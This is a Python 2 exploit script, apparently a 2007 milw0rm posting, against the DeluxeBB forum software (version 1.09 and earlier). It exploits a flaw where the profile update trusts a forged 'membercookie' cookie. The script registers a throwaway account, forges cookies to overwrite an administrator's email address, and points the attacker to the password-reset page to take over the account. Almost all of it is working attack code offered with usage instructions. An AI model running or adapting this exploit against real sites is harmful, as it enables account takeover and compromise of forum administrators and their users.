#!/usr/bin/python
#-*- coding: iso-8859-15 -*-
'''
 _ __   _____  _____ _ __
| '_ \ / _ \ \/ / _ \ '_ \
| | | |  __/>  <  __/ | | |
|_| |_|\___/_/\_\___|_| |_|

------------------------------------------------------------------------------------------------
Ã‚Â§ DeluxeBB 0day Remote Change Admin's credentials Ã‚Â§
------------------------------------------------------------------------------------------------
nexen
------------------------------------------------------------------------------------------------
PoC / Bug Explanation:
When you update your profile,
DeluxeBB execute a vulnerable query:

$db->unbuffered_query("UPDATE ".$prefix."users SET email='$xemail', msn='$xmsn', icq='$xicq', ... WHERE (username='$membercookie')");

So, editing cookie "membercookie" you can change remote user's email.

Enjoy ;)
------------------------------------------------------------------------------------------------

'''


import httplib, urllib, sys, md5
from random import randint
print "\n########################################################################################"
print "                    DeluxeBB <= 1.09 Remote Admin's/User's Email Change                   "
print "                                                                                          "
print "                            Vulnerability Discovered By Nexen                             "
print "                        Greetz to The:Paradox that Coded the Exploit.                     "
print "                                                                                          "
print " Usage:                                                                                   "
print " %s [Target] [VictimNick] [Path] [YourEmail] [AdditionalFlags]                            " % (sys.argv[0])
print "                                                                                          "
print " Additional Flags:                                                                        "
print " -id34 -passMypassword -port80                                                            "
print "                                                                                          "
print " Example:                                                                                 "
print " python %s 127.0.0.1 admin /DeluxeBB/ me@it.com -port81                                   " % (sys.argv[0])
print "                                                                                          "
print "########################################################################################\n"
if len(sys.argv)<=4:	sys.exit()
else:   print "[.]Exploit Starting."

target = sys.argv[1]
admin_nick = sys.argv[2]
path = sys.argv[3]
real_email = sys.argv[4]

botpass = "the-new-administrator"
rand = randint(1, 99999)
dn1 = 0
dn2 = 0
dn3 = 0

try:
 for line in sys.argv[:]:
	if line.find('-pass') != -1 and dn1 == 0:
		upass = line.split('-pass')[1]
		dn1 = 1
	elif line.find('-pass') == -1 and dn1 == 0:
		upass = ""
	if line.find('-id') != -1 and dn2 == 0:
		userid = line.split('-id')[1]
		dn2 = 1
	elif line.find('-id') == -1 and dn2 == 0:
		userid = ""

	if line.find('-port') != -1 and dn3 == 0:
		port = line.split('-port')[1]
		dn3 = 1
	elif line.find('-port') == -1 and dn3 == 0:
		port = "80"
except:
	sys.exit("[-]Some error in Additional Flag.")
if upass=="" and userid != "" or userid == "" and upass != "":
	print "[-]Bad Additional flags -id -pass given, ignoring them."
	upass=""
	userid=""
############################################################################################Trying to connect.
try:
	conn = httplib.HTTPConnection(target,port)
	conn.request("GET", "")
except: sys.exit("[-]Cannot connect. Check Target.")
############################################################################################Registering a new user if id or upass not defined
try:
	conn = httplib.HTTPConnection(target,port)
	if upass == "" or userid == "":
		conn.request("POST", path + "misc.php?sub=register", urllib.urlencode({'submit': 'Register','name': 'th331337.%d' % (rand) , 'pass': botpass,'pass2': botpass,'email': 'root%d@yoursystemgotpowned.it' % (rand) }), {"Accept": "text/plain","Content-type": "application/x-www-form-urlencoded"})
		response = conn.getresponse()
		cookies = response.getheader('set-cookie').split(";")
		#print "\n\nth331337.%d \n\nthe-new-administrator" % (rand)
		print "[.]Registering a new user. -->",response.status, response.reason
		conn.close()
############################################################################################Getting memberid in Cookies
		for line in cookies[:]:
			if line.find('memberid') != -1:
				mid = line.split('memberid=')[1]
############################################################################################Isset like starts
		try: mid
		except NameError: sys.exit("[-]Can't Get \"memberid\". Failed. Something has gone wrong. If you have not done yet, you may have to register manually and use flags -id -pass")
except AttributeError:
	sys.exit("[-]AttributeError Check your Target/path.")
############################################################################################Doing some Md5
if upass=="" or userid=="":
	hash = md5.new()
	hash.update(botpass)
	passmd5 = hash.hexdigest()
else:
	hash = md5.new()
	hash.update(upass)
	passmd5 = hash.hexdigest()
	mid = userid
############################################################################################Updating "victim" email in Profile
conn = httplib.HTTPConnection(target,port)
conn.request("POST", path+"cp.php?sub=settings", urllib.urlencode({'submit': 'Update','xemail': real_email}), {"Accept": "text/plain","Cookie": "memberid="+mid+"; membercookie="+admin_nick+";memberpw="+passmd5+";" ,"Content-type": "application/x-www-form-urlencoded"})
response = conn.getresponse()
print "[.]Changing \""+admin_nick+"\" Email With \"" + real_email + "\" -->",response.status, response.reason
conn.close()
print "[+]All Done! Email changed!!!\n\n You can reset \""+admin_nick+"\" password here -> "+target+path+"misc.php?sub=lostpw :D\n\n Have Fun =)\n"

# milw0rm.com [2007-11-26]